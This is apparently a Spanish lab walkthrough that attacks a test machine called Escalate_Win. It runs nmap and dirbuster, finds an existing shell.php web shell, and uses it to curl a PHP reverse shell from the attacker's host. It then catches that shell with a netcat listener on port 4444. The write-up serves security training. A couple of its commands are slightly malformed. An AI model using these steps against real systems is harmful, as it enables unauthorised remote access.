@@ -1,0 +1,67 @@
+I"<h1 id="pentesting-escalate_win">Pentesting Escalate_Win</h1>
+
+<h3 id="reconocimiento">Reconocimiento</h3>
+<p>Escaneamos con <strong>nmap</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -T4 [IP DE LA VÍCTIMA] -oN nmap.txt 
+</code></pre></div></div>
+<p><img src="20220513115055.png" alt="" /></p>
+
+<p>Vemos que la máquina tiene el puerto 80 abierto(<strong>http</strong>), por lo tanto, es accesible desde un navegador web:
+<img src="20220513115328.png" alt="" /></p>
+
+<p>Lanzamos un ataque de diccionario con <strong>dirbuster</strong> para descubrir que directorios hay disponibles:
+<img src="20220513120012.png" alt="" /><br />
+Detectamos un archivo que parece interesante “<strong>shell.php</strong>”:
+<img src="20220513120328.png" alt="" />
+<img src="20220513121121.png" alt="" />
+Como vemos se pueden ejecutar comandos a través de parametros en la url:
+<img src="20220513121252.png" alt="" /></p>
+
+<h3 id="exploit">Exploit</h3>
+<p>Para conseguir una consola interactiva con la máquina víctima utilizamos una <strong>shell inversa</strong> y <strong>netcat</strong>:</p>
+
+<p>En este caso he escogido esta, ya que es compatible con Windows: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</p>
+
+<p>Descargamos la shell a nuestra máquina con el comando <strong>wget</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
+</code></pre></div></div>
+
+<p>Ahora editamos el código de <strong>php_reverse_shell.php</strong> para que conecte a nuestra máquina:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano php_reverse_shell.php
+</code></pre></div></div>
+<p><img src="20220513122810.png" alt="" /><br />
+<em>En mi caso la ip de kali es 192.168.3.249 y utilizaré el puerto 4444</em>
+Una vez editado guardamos con <strong>CTRL+S</strong> y cerramos con <strong>CTRL+X</strong></p>
+
+<p>Lo siguiente es iniciar un <strong>servidor http</strong> para poder descargar la shell en la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 -m http.server 80
+</code></pre></div></div>
+<p><img src="20220513123751.png" alt="" /></p>
+
+<p>Descargamos la shell a la máquina víctima desde el navegador utilizando <strong>curl</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[IP DE LA VÍCTIMA]/shell.php?cmd=curl+http://[IP DEL ATACANTE]/php_reverse_shell.php+-O+php_reverse_shell.php
+</code></pre></div></div>
+<p><em>Si todo ha ido bien, el servidor nos contestara con una página en blanco</em></p>
+
+<p>Podemos ver que nuestro shell se ha subido correctamente:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[IP DE LA VÍCTIMA]/shell.php?ls+-la
+</code></pre></div></div>
+<p><img src="20220513125043.png" alt="" /><br />
+Ya podemos cerrar el servidor http en kali.</p>
+
+<p>Ponemos <strong>netcat</strong> a la escucha en el puerto 4444:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+<p><img src="20220513125601.png" alt="" /></p>
+
+<p>Lo unico que falta es ejecutar la shell en la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[IP DE LA VÍCTIMA]/php_reverse_shell.php.php
+</code></pre></div></div>
+<p><em>Si todo va bien, el navegador se quedara cargando.</em></p>
+
+<p>Listo, hemos recibido una conexion en netcat que nos da acceso remoto a la máquina víctima:
+<img src="20220513130346.png" alt="" />
+<img src="20220513130922.png" alt="" /></p>
+
+<p>A partir de aquí pasaríamos a la fase de <strong>escalada de privilegios</strong>.</p>
+:ET
